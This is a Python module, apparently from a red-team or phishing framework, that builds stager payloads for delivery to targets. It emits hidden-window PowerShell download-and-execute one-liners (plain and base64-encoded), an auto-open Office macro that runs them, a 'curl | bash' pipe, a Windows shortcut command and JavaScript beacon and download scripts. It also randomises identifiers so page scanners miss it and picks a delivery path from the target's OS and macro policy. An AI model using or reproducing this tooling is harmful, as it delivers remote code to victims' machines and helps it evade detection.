# ============================================================================
# FILE: core/stager.py
# ============================================================================
"""Stagers: the text that turns "you clicked" into "you ran something".

This module builds stager TEXT - the payload string a delivery pipeline hands to a target. It
builds text, it does not build a backdoor: the remote payload is the engagement's business, and
none of these builders ships one.

The limits, stated plainly, because an operator who believes a browser can do more than
it can plans the wrong thing:

  * A browser cannot write an executable to disk on its own. A fetched file reaches disk only
    through a USER GESTURE - a click on a download link. A page with no gesture can read and
    post, and nothing more. The 'download' and 'exec' modes respect that line.
  * The HTA, SCT and VBA paths are WINDOWS ONLY. There is no equivalent on macOS or Linux.
  * A macro needs the document opened with macros ENABLED, which is a policy decision the
    target's tenant makes, not the operator. `deliver_plan()` reports that as SUSPECTED when
    the policy is unknown and never pretends to know it.
  * The JS 'exec' mode CANNOT execute a native payload. It can only fetch the file and hand it
    to the user as a download. Its own output carries the marker BROWSER-EXEC-LIMIT and says so
    in a comment, because the difference between "delivered" and "executed" is the whole point.

Nothing here calls eval() on remote code, and every retry loop in the emitted JavaScript is
bounded by a fixed count, never a while-true.

Detection travels with the module: each builder's comment names the observable at the point it
is created - a first-seen download, a hidden-window interpreter, a document that spawned a
child process - because a stager that states what it cannot do should be equally
explicit about what it looks like from the defensive side.
"""
import base64
import json
import re

__all__ = ["EXEC_LIMIT", "bash", "deliver_plan", "encode_command", "js", "lnk_command",
           "powershell", "vba"]

# The limit for mode='exec', exposed so a caller (and its tests) can state the same
# sentence the generated JavaScript carries. Kept free of double quotes so it embeds verbatim.
EXEC_LIMIT = ("BROWSER-EXEC-LIMIT: a browser cannot start a process; mode 'exec' can only "
              "fetch the file and hand it to the user as a download - it does NOT run it")

# A url reaches a shell, a single-quoted PS/VBA/bash literal and a JSON string literal, so a
# quote, a backtick or whitespace in it would break the generated command. Rejecting them here
# is cheaper than escaping each dialect differently and getting one of them wrong.
_BAD_URL_CHARS = re.compile(r"[\s'\"`]")

# VBA sub names are identifiers: anything else could inject a statement into the macro source.
_VBA_NAME_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]{0,80}$")

DEFAULT_RETRIES = 3
MAX_RETRIES = 8                     # a bounded ceiling: "every retry bounded"
DEFAULT_TIMEOUT_MS = 12000
MIN_TIMEOUT_MS = 100
MAX_TIMEOUT_MS = 60000

# The stager's own JavaScript identifiers. A fixed set is a signature a page-side scanner can
# grep for, so the same per-campaign randomisation the collector uses applies here too:
# Symbols.fixed() keeps the historical `__bh_` names, Symbols.random_() derives a fresh stem
# from the campaign's session symbol, and two random campaigns do not share a name.
_JS_NAME_SUFFIXES = ("url", "mode", "limit", "tries", "timeout", "send", "count", "done",
                     "blob", "link")

_JS_MODES = ("beacon", "download", "exec", "redirect")

# ------------------------------------------------------------------ JavaScript ---
# These templates contain no '%' of their own, so the mapping-style substitution below is
# unambiguous. The placeholders are the campaign's (possibly renamed) identifiers and the
# JSON-encoded literals, never raw option values.
_JS_BEACON = """\
(function () {
  "use strict";
  var %(URL)s = %(URL_JSON)s;
  var %(TRIES)s = %(RETRIES)s;
  var %(TIMEOUT)s = %(TIMEOUT_MS)s;
  var %(COUNT)s = 0;
  var page = String(location.href).slice(0, 400);
  var body = JSON.stringify({ v: 1, ts: Date.now(), page: page });
  /* hard cap: the beacon body is bounded to 2 KB and can never grow past it */
  if (body.length > 2048) { body = body.slice(0, 2048); }
  function %(SEND)s() {
    if (%(COUNT)s >= %(TRIES)s) { return; }   /* bounded: a fixed number of attempts, then stop */
    %(COUNT)s += 1;
    try {
      if (navigator.sendBeacon && navigator.sendBeacon(%(URL)s, body)) { return; }
    } catch (e) {}
    try {
      fetch(%(URL)s, { method: "POST", body: body, keepalive: true,
                       headers: { "Content-Type": "application/json" } });
      return;
    } catch (e) {}
    try {
      var x = new XMLHttpRequest();
      x.open("POST", %(URL)s, true);
      x.setRequestHeader("Content-Type", "application/json");
      x.send(body);
    } catch (e) { setTimeout(%(SEND)s, 250 * %(COUNT)s); }
  }
  %(SEND)s();
})();
"""

_JS_DOWNLOAD = """\
(function () {
  "use strict";
  var %(URL)s = %(URL_JSON)s;
  var %(TRIES)s = %(RETRIES)s;
  var %(TIMEOUT)s = %(TIMEOUT_MS)s;
  var %(COUNT)s = 0;
  function %(SEND)s() {
    if (%(COUNT)s >= %(TRIES)s) { return; }   /* bounded: a fixed number of attempts, then stop */
    fetch(%(URL)s, { cache: "no-store" }).then(function (r) {
      if (!r.ok) { throw new Error("http " + r.status); }
      return r.blob();
    }).then(function (b) {
      var u = URL.createObjectURL(b);
      var a = document.createElement("a");
      a.href = u;
      a.download = "update.bin";
      document.body.appendChild(a);
      a.click();                          /* the user's own gesture is what saves the file */
      document.body.removeChild(a);
      setTimeout(function () { URL.revokeObjectURL(u); }, %(TIMEOUT)s);
    }).catch(function () {
      %(COUNT)s += 1;
      if (%(COUNT)s < %(TRIES)s) { setTimeout(%(SEND)s, 250 * %(COUNT)s); }
    });
  }
  %(SEND)s();
})();
"""

_JS_EXEC = """\
(function () {
  "use strict";
  /* BROWSER-EXEC-LIMIT: a browser cannot start a process. This mode can only fetch the file
     and hand it to the user as a download; it does NOT run it, and it never evals remote
     code. See the module docstring for the same limit, stated there as a rule. */
  var %(LIMIT)s = %(LIMIT_JSON)s;
  var %(URL)s = %(URL_JSON)s;
  var %(TRIES)s = %(RETRIES)s;
  var %(TIMEOUT)s = %(TIMEOUT_MS)s;
  var %(COUNT)s = 0;
  function %(SEND)s() {
    if (%(COUNT)s >= %(TRIES)s) { return; }   /* bounded: a fixed number of attempts, then stop */
    fetch(%(URL)s, { cache: "no-store" }).then(function (r) {
      if (!r.ok) { throw new Error("http " + r.status); }
      return r.blob();
    }).then(function (b) {
      var u = URL.createObjectURL(b);
      var a = document.createElement("a");
      a.href = u;
      a.download = "update.bin";
      document.body.appendChild(a);
      a.click();                          /* the user's own gesture is what saves the file */
      document.body.removeChild(a);
      setTimeout(function () { URL.revokeObjectURL(u); }, %(TIMEOUT)s);
    }).catch(function () {
      %(COUNT)s += 1;
      if (%(COUNT)s < %(TRIES)s) { setTimeout(%(SEND)s, 250 * %(COUNT)s); }
    });
  }
  %(SEND)s();
})();
"""

_JS_REDIRECT = """\
(function () {
  "use strict";
  /* a plain navigation: no retry loop is needed and none is emitted */
  var %(URL)s = %(URL_JSON)s;
  location.replace(%(URL)s);
})();
"""

_JS_TEMPLATES = {"beacon": _JS_BEACON, "download": _JS_DOWNLOAD, "exec": _JS_EXEC,
                 "redirect": _JS_REDIRECT}


def _js_str(value):
    """A JSON string literal that is safe inside an inline <script>.

    `json.dumps` escapes quotes and (with its default) non-ASCII, but NOT `<` or `>`, so a
    value containing `</script>` would close the element and inject markup into the page.
    Those two are written as JSON unicode escapes: still the same string in JS, unable to end
    the element.
    """
    return json.dumps(str(value)).replace("<", "\\u003c").replace(">", "\\u003e")


def _require_url(url):
    """A url this module can safely place into a shell/powershell/VBA/JSON literal."""
    text = str(url or "").strip()
    if not text:
        raise ValueError("a stager needs a non-empty url")
    if _BAD_URL_CHARS.search(text):
        raise ValueError("url contains a character that would break the generated command: "
                         f"{url!r}")
    return text


def _bounded_int(value, name, default, low, high):
    """An integer option clamped to [low, high]; a bad value is refused, not guessed."""
    if value is None:
        value = default
    try:
        number = int(value)
    except (TypeError, ValueError) as exc:
        raise ValueError(f"{name} must be an integer, got {value!r}") from exc
    if not low <= number <= high:
        raise ValueError(f"{name} must be between {low} and {high}, got {number}")
    return number


def _js_names(symbols):
    """The stager's JavaScript identifier names for one campaign.

    The stem comes from the campaign's symbols, so the rename that keeps the collector from
    being a fixed signature keeps the stager from being one too. A fixed (or absent) symbol
    set keeps the historical `__bh_` names, so runbooks and tests written against them work.
    """
    if symbols is not None and getattr(symbols, "random", False):
        raw = str(getattr(symbols, "session", "") or "")
        stem = re.sub(r"[^A-Za-z0-9]+", "_", raw).strip("_")
    else:
        stem = "bh"
    if not stem or not re.match(r"^[A-Za-z_]", stem):
        stem = f"bh_{stem}" if stem else "bh"
    return {suffix: f"__{stem}_{suffix}" for suffix in _JS_NAME_SUFFIXES}


def encode_command(text):
    """UTF-16LE then base64: exactly the encoding `-EncodedCommand` expects.

    PowerShell reads the argument as bytes, decodes them as UTF-16LE and runs the result.
    Base64 of a UTF-8 string is the common mistake and produces mojibake that runs or fails
    unpredictably, so the encoding is explicit and tested both directions.
    """
    return base64.b64encode(str(text).encode("utf-16le")).decode("ascii")


# ------------------------------------------------------------------- PowerShell ---
def _downloadstring(url):
    """The inner PowerShell command both `powershell()` styles wrap."""
    return f"IEX (New-Object Net.WebClient).DownloadString('{url}')"


def powershell(url, *, style="iex"):
    """The PowerShell one-liner that pulls and runs a remote script.

    `iex` is the readable DownloadString + IEX form; `enc` is the same command as a
    `-EncodedCommand` argument behind a hidden window, which survives the shell's quote
    handling and leaves no cleartext url in a process command line. Detection sees both the
    same way: a first-seen process doing its own HTTPS.
    """
    url = _require_url(url)
    inner = _downloadstring(url)
    if style == "enc":
        return f"powershell -nop -w hidden -enc {encode_command(inner)}"
    if style != "iex":
        raise ValueError(f"unknown powershell style {style!r}; have: iex, enc")
    return f'powershell -nop -w hidden -c "{inner}"'


# --------------------------------------------------------------------------- VBA ---
def vba(url, *, module="AutoOpen"):
    """An Office macro that runs the PowerShell one-liner when the document opens.

    Windows only, and the document must be opened with macros ENABLED: the auto-open event
    simply does not fire in a protected-view or macro-blocked document. The one-liner's own
    double quotes are doubled, because that is how VBA escapes a quote inside a string.
    """
    url = _require_url(url)
    if not _VBA_NAME_RE.match(str(module)):
        raise ValueError(f"unsafe VBA sub name: {module!r}")
    run = f'powershell -nop -w hidden -c "{_downloadstring(url)}"'
    escaped = run.replace('"', '""')
    lines = [
        f"Sub {module}()",
        "    Dim o As Object",
        '    Set o = CreateObject("WScript.Shell")',
        f'    o.Run "{escaped}", 0, False',
        "End Sub",
    ]
    # CRLF: the target host is Windows and Word/Excel tolerate nothing else in a .bas import.
    return "\r\n".join(lines)


# ------------------------------------------------------------- command-line forms ---
def bash(url):
    """The POSIX command-line form: fetch and pipe to a shell.

    macOS and Linux; it needs a shell the user actually runs, which is the same user-gesture
    limit the browser paths have, one layer down.
    """
    url = _require_url(url)
    return f"curl -fsSL '{url}' | bash"


def lnk_command(url):
    """The Windows command-line form for a .lnk target/argument.

    A shortcut's target must be an executable, so the one-liner rides as an argument to
    cmd.exe; opening the shortcut is still the user's gesture.
    """
    url = _require_url(url)
    return f'cmd /c "powershell -nop -w hidden -c ""{_downloadstring(url)}"""'


# --------------------------------------------------------------------------- JS ---
def js(options):
    """A browser stager as a JavaScript string, for one mode.

    options: {'url' (required), 'mode' in ('beacon','download','redirect','exec'),
    'symbols' (a core.symbols.Symbols instance or None), 'retries' (default 3),
    'timeout_ms'}. 'beacon' posts a bounded JSON body (<= 2 KB) and stops; 'download' fetches
    the url and offers it as a Blob download; 'redirect' navigates; 'exec' is browser-limited
    and says so in its own comment (see EXEC_LIMIT).
    """
    if not isinstance(options, dict):
        raise ValueError("js() takes an options dict with a 'url'")
    url = _require_url(options.get("url"))
    mode = str(options.get("mode") or "beacon").strip().lower()
    if mode not in _JS_MODES:
        raise ValueError(f"unknown stager mode {mode!r}; have: {', '.join(sorted(_JS_MODES))}")
    retries = _bounded_int(options.get("retries"), "retries", DEFAULT_RETRIES, 1, MAX_RETRIES)
    timeout = _bounded_int(options.get("timeout_ms"), "timeout_ms", DEFAULT_TIMEOUT_MS,
                           MIN_TIMEOUT_MS, MAX_TIMEOUT_MS)
    names = _js_names(options.get("symbols"))
    values = {
        "URL": names["url"], "URL_JSON": _js_str(url),
        "TRIES": names["tries"], "RETRIES": str(retries),
        "TIMEOUT": names["timeout"], "TIMEOUT_MS": str(timeout),
        "COUNT": names["count"], "SEND": names["send"],
        "LIMIT": names["limit"], "LIMIT_JSON": _js_str(EXEC_LIMIT),
    }
    return _JS_TEMPLATES[mode] % values


# ---------------------------------------------------------------- delivery plan ---
_OPEN_POLICY = {"enabled", "allowed", "on", "yes", "true", "open", "permitted", "allow"}
_SHUT_POLICY = {"disabled", "blocked", "off", "no", "false", "closed", "deny", "denied",
                "disallowed", "restricted", "block"}
_CONFIDENCE_ORDER = {"CONFIRMED": 0, "SUSPECTED": 1, "FAILED": 2}


def _policy_state(value):
    """A policy fact as a confidence label: open -> CONFIRMED, shut -> FAILED, else SUSPECTED."""
    text = str(value or "").strip().lower()
    if text in _OPEN_POLICY:
        return "CONFIRMED"
    if text in _SHUT_POLICY:
        return "FAILED"
    return "SUSPECTED"


def deliver_plan(facts):
    """Which stager fits these facts, best first, with a confidence label each.

    facts: {'os', 'browser', 'macro_policy', 'hta_policy'}. Every entry is
    {'kind', 'why', 'confidence'} where confidence is CONFIRMED (a fact says the path is
    open), SUSPECTED (the path is plausible but a fact is unknown) or FAILED (a fact says the
    path is closed). CONFIRMED sorts first; a FAILED entry is kept so the operator can see
    the path was considered and why it is out. With no OS and no browser the answer is a
    single "nothing can be chosen yet" entry rather than a guess.
    """
    facts = facts if isinstance(facts, dict) else {}
    os_name = str(facts.get("os") or "").strip().lower()
    browser = str(facts.get("browser") or "").strip().lower()
    macro = _policy_state(facts.get("macro_policy"))
    hta = _policy_state(facts.get("hta_policy"))

    windows = os_name in ("windows", "win", "win32", "win64", "win10", "win11")
    unixish = os_name in ("linux", "macos", "mac", "darwin", "unix", "termux", "bsd")
    known_os = bool(os_name)

    plan = []

    # Browser-side stagers need only a browser and are OS-independent: they never touch disk
    # without the user's own click, so they are the safest thing to rank first.
    bconf = "CONFIRMED" if browser else "SUSPECTED"
    plan.append({"kind": "js-beacon", "confidence": bconf,
                 "why": "an inline stager posts a bounded beacon over the page itself: no "
                        "gesture, no disk write, works in any browser"})
    plan.append({"kind": "js-download", "confidence": bconf,
                 "why": "fetches the payload and offers it as a Blob download; the browser "
                        "still needs one user click to save the file"})
    plan.append({"kind": "js-exec", "confidence": "SUSPECTED",
                 "why": "browser-limited: it can only hand the file to the user, it cannot "
                        "run a native payload (BROWSER-EXEC-LIMIT)"})

    if windows:
        plan.append({"kind": "vba", "confidence": macro,
                     "why": "an Office macro runs the PowerShell one-liner on document open; "
                            "needs the document opened with macros enabled"})
        plan.append({"kind": "powershell-enc", "confidence": "CONFIRMED",
                     "why": "the encoded, hidden-window one-liner for a Run dialog, a shortcut "
                            "or a script host on Windows"})
        plan.append({"kind": "lnk", "confidence": "CONFIRMED",
                     "why": "a Windows shortcut command line; opening the shortcut is the "
                            "user's gesture"})
        plan.append({"kind": "hta", "confidence": hta,
                     "why": "an HTA page (mshta <url>) runs a script with more reach than a "
                            "browser tab; Windows only"})
    elif unixish:
        plan.append({"kind": "bash", "confidence": "CONFIRMED",
                     "why": "a POSIX pipe (curl | bash) for macOS and Linux; needs a shell the "
                            "user actually runs"})
    elif known_os:
        plan.append({"kind": "unknown-os", "confidence": "SUSPECTED",
                     "why": f"the OS {os_name!r} is not one this module has a stager shape for"})

    if not (known_os or browser):
        # No fingerprint, no defensible choice: this is the empty answer, not a guess.
        return [{"kind": "none", "confidence": "SUSPECTED",
                 "why": "neither the OS nor the browser is known, so no stager can be chosen "
                        "collect a fingerprint first"}]

    plan.sort(key=lambda entry: _CONFIDENCE_ORDER[entry["confidence"]])
    return plan
